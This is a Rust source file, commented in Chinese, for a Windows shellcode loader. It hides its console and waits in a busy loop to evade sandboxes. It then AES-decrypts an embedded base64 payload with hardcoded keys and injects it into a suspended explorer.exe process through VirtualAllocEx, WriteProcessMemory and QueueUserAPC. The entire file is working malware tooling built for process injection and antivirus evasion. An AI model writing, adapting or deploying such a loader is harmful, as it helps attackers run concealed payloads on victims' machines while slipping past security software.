#![windows_subsystem = "windows"]
// 隐藏windows黑窗
// 编译优化--out-dir ../
// #cargo build -Z build-std=std,panic_abort -Z build-std-features=panic_immediate_abort -Z unstable-options  --target x86_64-pc-windows-msvc  --release
use libaes::Cipher;
use std::ptr::{null, null_mut};
use windows::Win32::Foundation::{BOOL, CloseHandle, GetLastError};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateProcessW,CREATE_SUSPENDED,CREATE_NO_WINDOW, STARTUPINFOW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use std::mem::{zeroed, size_of};
use std::time::{Duration, Instant};
use windows::core::{PCWSTR, PWSTR};
use obfstr::obfstr;

fn main() {
    //延迟3分钟加载
    delay();
    //解密shellcode
    let (myshell,path) = decrypt_myshll();
    //执行shellcode
    unsafe{
        //调用CreateProcessW windowsapi
        let temp = zeroed::<SECURITY_ATTRIBUTES>();//Returns the value of type T represented by the all-zero byte-pattern.
        let mut  info = zeroed::<STARTUPINFOW>();
        info.cb = size_of::<STARTUPINFOW>() as _;
        let mut info2 = zeroed::<PROCESS_INFORMATION>();
        //CreateProcessW 函数可以创建一个新的进程，并在该进程中执行指定的可执行文件。
        //它接受一些参数，包括要执行的可执行文件的路径、命令行参数、进程的安全性选项等。
        //CreateProcessW 函数返回一个布尔值，指示进程的创建是否成功。
        if CreateProcessW(
            PCWSTR(path.as_ptr() as _),
            PWSTR(std::ptr::null_mut()),
            &temp,&temp,
            BOOL(1),
            CREATE_NO_WINDOW|CREATE_SUSPENDED,
            null(),
            PCWSTR(null()),
            &info as _,
            &mut info2
        ).as_bool(){
            //VirtualAllocEx 函数用于在指定的进程空间中分配虚拟内存。它接受一些参数，包括要分配内存的进程句柄、要分配的内存大小、内存保护选项等。
            //分配的内存可以是私有的，只有分配它的进程可以访问，也可以是共享的，允许多个进程访问。
            // 函数返回分配的内存的起始地址，或者返回 NULL 表示分配失败。
            //分配的内存可以通过其他函数（例如 WriteProcessMemory）在指定的进程空间中进行读写操作
            let addr = VirtualAllocEx(info2.hProcess, null(), myshell.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            //使用WriteProcessMemory 开辟这么个大小的进程空间，并将指针指向myshll的地址
            WriteProcessMemory(info2.hProcess, addr, myshell.as_ptr() as _, myshell.len(), null_mut());
            //QueueUserAPC 函数用于向指定线程的执行队列中插入一个用户模式的异步过程调用 (APC) 函数。
            //当目标线程达到一个特定的状态（例如进入警报状态或执行等待操作时），操作系统会在适当的时机调用 APC 函数，以便在目标线程中执行用户定义的操作。
            QueueUserAPC(Some(std::mem::transmute(addr)),info2.hThread,0);
            //感觉是用来触发QueueUserAPC的
            ResumeThread(info2.hThread);
            CloseHandle(info2.hThread);
        }else{
            println!("failed : {:?}",GetLastError());
        }
    }

}

fn base64_decode(myshell:String)->Vec<u8>{
    // base64::decode_config(myshell,base64::STANDARD_NO_PAD).unwrap()
    base64::decode(myshell).unwrap()
}

fn decrypt_myshll() -> (Vec<u8>,Vec<u16>){
    let MYSHELL: &str = "e6RBGrxHr67wednpnkU9gmeYhvWQ7mJCNMsHUwlyedklCh7muPyR7XAVaA+FhQeMi+hTt9oBJiUJdL2jkFK7MjPH1Pqt6N3IPsuEc/eYrouLyKa1VStw5XTPzLo5U/e3WiiCwjEIEglKHYkExZLfGPnwc8r1wTKI4u4cYr5Ih3wmQoSikBxmdi2XiDmyYle24FPGaQ1zcpY54E4QB6JUiPzDyuu4VafgHV7HPxGiRYmgvyztg80JDbcb9rJuS8TTitKocAt6LIR5cBObMUFnkiLyR0tkP0QNDjfBY6EGg2nrcLY/t7qwPsqGeZsghoB0FUzHsE5JOTdhMBXW68w8LeGP0vjz2wW3NGw/uVP1pRA0sZHIx8K3NlJb4dv0xyxxmApJaQLR0dPy3cr9X2fdb04/zsWt51Wy0Ie3CyZYQmFbUD0EbqWdZwO4+Q5SX6V1sPSWMjVh1gIojSVV3/MMrgG6MY5Uhc/m1cYXU8JDdmDI6QxDlSj0CeWRwS0FqkBNTtowNgnjKgppjT53gZW6jWrPdc37SuCUbRWCdT4eNqPx6HygQ+TWZxpOMni6yn8829e1VdbFH0O7d3n7Bptc/aNzwcKjvTm3jGxgA3zP2y+oWIrnaIQn5xpP+qU+7fwyh+Ct8wO0sFA/kfBASFXI7PayAR64KobwHdxPvxAgYlzAd8lfQrkLGB5Q9AqRY9aVnf84bshjZ9UqOPBVZuZseT57yqMPZxJ7lRx66i4vsc40Joz+6cbWe4vIScke1BBcD4C/fJfIQN+VTSLWFNSwIq5Q6Wd3fIrvKrfznSrvhO3i47r1LcxZVFBCuOq8nyQl7vJF+2xI/yk6bL7rqM60hqJdmCSft0THWC5BqDRCoqmBPuJ3rwrYt6uzck88UjkjGvzCjmKwLwVLroqOs0yimXQX3DKT7jyMSUBA8YHz43fwxEFQomsuCfMBkfg636feKUs3GFxwFhSu/Fs1k/XGQd3pBq1C8Oq2UtGplhLb86ZcXXrX39+KXFJPwzRD+LyLP7rJegmTq6cX+bQSLf+QFc213Zg6L5ZiD6mYUVmjpsjm1EEXlbs2rU8ZL81S89JR3c4/97wnZh6NeGyK3aXhyz4d+GhoS7+vSGKLmhr8G+8d9rFLTD1IcmIjVDhIy40g10BD0tqNTRO6otLHJCqxxUm4Me9ku1Qn24Nhrczerbo=";
    let PASSWORD1: &[u8; 16] = b"vqnnjfceryokkbdw";
    let PASSWORD2: &[u8; 16] = b"lxfyrskhoqirmiap";
    let cipher = Cipher::new_128(&PASSWORD1);
    let myshell = base64_decode(String::from(MYSHELL));
    let myshell = cipher.cbc_decrypt(PASSWORD2, &myshell[..]);
    // let path:Vec<u16> = obfstr!("C:\\Windows\\syswow64\\svchost.exe\0").encode_utf16().collect();
    let path:Vec<u16> = obfstr!("C:\\Windows\\explorer.exe\0").encode_utf16().collect();
    (myshell,path)
}
//等价sleep函数
fn delay() {
    let start_time = Instant::now();
    let end_time = start_time + Duration::from_secs(30);
    // println!("{:?},{:?}",start_time,end_time);
    loop {
        let start_time = Instant::now();
        if start_time >= end_time{
            break;
        }
    }
}